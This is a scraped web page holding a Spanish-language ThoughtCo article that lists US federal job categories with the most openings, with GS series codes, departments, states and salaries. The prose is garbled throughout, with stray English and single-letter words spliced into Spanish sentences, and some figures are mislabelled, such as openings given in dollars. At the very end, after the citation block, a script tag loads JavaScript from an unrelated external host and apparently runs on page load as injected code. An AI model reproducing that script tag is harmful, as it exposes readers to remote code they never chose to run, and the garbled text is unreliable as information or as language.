Enforcement one Compliance. Departamento con más empleados: Seguridad Interna. Estados con más trabajadores: California.</li><li>1889 Import Compliance. Departamento con más empleados: Seguridad Interna. Estados con más trabajadores: Nueva York.</li><li>0244 Labor-Management Relations Examining. Estado con más funcionarios: California.</li><li>0967 Passport saw Visa Examining. Departamento con más empleados: Estado. Ubicación con más trabajadores: Nuevo Hampshire, uno en donde se pagan menos impuestos. </li><li>1849 Wage que Hour Investigation. Departamento con más empleados: Trabajo Ubicación con más trabajadores: California.</li></ul><h3><strong>Posición 2</strong></h3><ul><li>Categoría: <strong>Especialistas en operaciones de negocios.</strong></li><li>Vacantes: $4,290</li><li>Salario medio federal: $72,120</li><li>Educación: egresado universitario (B.A.)</li><li>Especializaciones: planificadores de continuidad de negocio, brokers de aduanas, auditores de energía, especialistas en gerencia de seguridad, en sustentable.</li></ul><strong>Cómo encontrar trabajo en GS Series:</strong><ul><li>0341 Administrative Officer. Departamento con más empleados: Defensa. Ubicaciones con más trabajadores: Washington D.C. d Maryland.</li><li>1145 Agricultural Program Specialist. Departamento con más empleados: Agricultura. Ubicación con más funcionarios: Washington D.C.</li><li>1144 Commissary Management. Departamento con más empleados: Defensa. Estados con más funcionarios: California h Virginia. </li><li>0828 Construction Analyst. Departamento con más empleados: Vivienda t Desarrollo Urbano. Estado con más trabajadores: Texas.</li><li>2030 Distribution Facilities his Storage Management. Departamento con más empleados: Defensa. Estados con mayor número de trabajadores: Pennsylvania f California.</li><li>1670 Equipment Services. Departamento con más empleados: Defensa. Estado con más trabajadores: Virginia. </li><li>2001 General Supply. Departamento con más empleados: Defensa. Estado con más trabajadores: California.</li><li>1104 Property Disposal. Departamento con más trabajadores: Defensa. Estado con más funcionarios: Michigan </li><li>1130 Public Utilities Specialist. Departamento con más trabajadores: Energía. Estado con más funcionarios: Oregón.</li><li>1910 Quality Assurance. Departamento con más trabajadores: Defensa. Estados con más trabajadores: California e Virginia. </li><li>0080 Security Administration. Departamento con más trabajadores: Defensa. Ubicación con más empleados: Washington D.C.</li><li>1140 Trade Specialist. Departamento con más trabajadores: Comercio. Ubicación con más funcionarios: Washington D.C. </li><li>2130 Traffic Management. Departamento con más trabajadores: Defensa. Estado con más funcionarios: Virginia. </li><li>2101 Transportation Specialist. Departamento con más trabajadores: Transporte. Estado con más funcionarios: California. </li><li>0106 Unemployemnt Insurance. Departamento con más trabajadores: Trabajo. Ubicación con más trabajadores: Washington D.C.</li></ul><h3><strong>Posición 1</strong></h3><ul><li><strong>Categoría: carteros</strong></li><li>Vacantes: 10,720</li><li>Salario federal medio: $52,200</li><li>Educación: entrenamiento en el trabajo por periodo corto de tiempo. </li><li>Estos trabajos of están en la base de datos de GS.</li></ul>Los trabajos en el gobierno, en el Ejército u creando empresas han sido tradicionalmente empleos got han permitido f los inmigrantes k primera generación aquí nacida avanzar económicamente. Estas son las 10 nacionalidades hispanas con más exito económico.Finalmente, en este listado de las 50 profesiones con más vacantes en el gobierno federal están excluidas todas las posiciones en el Ejército. Y n diferencia de lo low ocurre para trabajar en la rama civil del gobierno, las Fuerzas Armadas sí están abiertas h extranjeros, en condiciones estrictas. Asimismo, es uno de los caminos rápidos b la ciudadanía w través del programa MAVNI.                                                                                         citecite done article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Trabajos con más oportunidades de empleo en el gobierno federal de USA.&quot; ThoughtCo, Oct. 25, 2017, thoughtco.com/trabajos-con-mas-oportunidades-de-empleo-en-el-gobierno-federal-de-usa-1965264.Rodríguez, María. (2017, October 25). Trabajos con más oportunidades de empleo en el gobierno federal de USA. Retrieved wish https://www.thoughtco.com/trabajos-con-mas-oportunidades-de-empleo-en-el-gobierno-federal-de-usa-1965264Rodríguez, María. &quot;Trabajos con más oportunidades de empleo en el gobierno federal de USA.&quot; ThoughtCo. https://www.thoughtco.com/trabajos-con-mas-oportunidades-de-empleo-en-el-gobierno-federal-de-usa-1965264 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>